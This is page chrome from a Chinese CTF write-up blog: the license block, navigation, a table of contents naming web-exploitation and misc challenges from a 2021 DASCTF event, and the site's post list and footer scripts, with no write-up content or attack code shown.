            <span>原始链接:</span><a class="post-url" href="/2021/08/09/2021DASCTF-July-X-CBCTF-4th/" title="2021DASCTF July X CBCTF 4th">https://swhat.github.io/2021/08/09/2021DASCTF-July-X-CBCTF-4th/</a>
            <span class="copy-path" data-clipboard-text="原文: https://swhat.github.io/2021/08/09/2021DASCTF-July-X-CBCTF-4th/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2021/08/13/RCTS-CERT-CTF2021/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          RCTS CERT CTF2021
        
      </div>
    </a>
  
  
    <a href="/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">PHP伪随机数漏洞</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Yusa%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AD%BE%E5%88%B0%E2%80%94%E2%80%94BlockTrick"><span class="toc-number">1.1.</span> <span class="toc-text">Yusa的密码学签到——BlockTrick</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrce"><span class="toc-number">2.1.</span> <span class="toc-text">ezrce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Yapi-Mock-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">Yapi Mock 远程命令执行漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cat-flag"><span class="toc-number">2.2.</span> <span class="toc-text">cat flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9Eascii%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87escapeshellarg"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">非ascii字符绕过escapeshellarg</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easythinkphp"><span class="toc-number">2.3.</span> <span class="toc-text">easythinkphp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP-3-x-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%ABRCE-getshell"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">ThinkPHP 3.x 日志包含RCE getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jspxcms"><span class="toc-number">2.4.</span> <span class="toc-text">jspxcms</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">jspxcms解压getshell漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cybercms"><span class="toc-number">2.5.</span> <span class="toc-text">cybercms</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Beescms-v4-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">Beescms_v4.0 sql注入漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jj%E2%80%99s-camera"><span class="toc-number">2.6.</span> <span class="toc-text">jj’s camera</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezSteganography"><span class="toc-number">3.1.</span> <span class="toc-text">ezSteganography</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#red-vs-blue"><span class="toc-number">3.2.</span> <span class="toc-text">red_vs_blue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Just-a-GIF"><span class="toc-number">3.3.</span> <span class="toc-text">Just a GIF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nuclear-wastewater"><span class="toc-number">3.4.</span> <span class="toc-text">Nuclear wastewater</span></a></li></ol></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">


<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
        <div id="gitments"></div>
<script src="/js/gitment.browser.js"></script>
<script>
    var gitment = new Gitment({
      id: window.location.pathname,
      owner: 'swhat',
      repo: 'swhat.github.io',
      oauth: {
        client_id: '',
        client_secret: '',
      },
    })
    gitment.render('gitments')
</script>
    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2021/08/13/RCTS-CERT-CTF2021/" title="上一篇: RCTS CERT CTF2021">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/" title="下一篇: PHP伪随机数漏洞">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/10/24/ISCTF2021/">ISCTF2021</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/13/RCTS-CERT-CTF2021/">RCTS CERT CTF2021</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/09/2021DASCTF-July-X-CBCTF-4th/">2021DASCTF July X CBCTF 4th</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/">PHP伪随机数漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/05/Docker-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/">Docker-练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/">文件上传之二次渲染</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/Docker-%E6%90%AD%E5%BB%BA%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83/">Docker-搭建题目环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/21/Docker-%E5%AE%89%E8%A3%85/">Docker-安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">Volatility内存取证</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/ISCC2021-Web-WP/">ISCC2021 Web WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/26/ISCC2021-MISC-WP/">ISCC2021 MISC WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/25/XXE%E6%BC%8F%E6%B4%9E/">XXE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/">浅析条件竞争漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">CISCN2021赛后复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/21/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SSTI模板注入漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/">Struts2之拦截器</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">USB流量分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/">HTTP请求走私漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/">HTTP协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">虎符+红明谷+ctfshow渔人杯赛后复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/">Struts2核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">CTFshow-Web入门-信息泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/">Struts2框架入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/">春秋杯新年欢乐赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/">CTFHub-Web-RCE练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/">线下AWD攻防赛总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/15/PHP%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/">PHP 数据库操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/">CTFHub-Web-文件上传练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/">CTFHub-Web-sql注入练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/">代码审计之弱类型绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/">CTFHub-Web-信息泄露练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈PHP反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/">RSA算法详解与练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/20/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/">PHP 文件与目录操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/03/PHP%20cookie%E4%B8%8Esession/">PHP cookie与session</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/22/PHP%20%E8%BF%90%E7%AE%97%E7%AC%A6/">PHP 运算符</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/20/PHP%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E9%87%8F/">PHP的基本概念和变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/">CTF-MISC总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/">个人博客搭建历程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/02/hello-world/">Hello World</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2022 Atkx
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/love.js"></script>
<!--浏览器搞笑标题-->
<script type="text/javascript" src="/js/FunnyTitle.js"></script>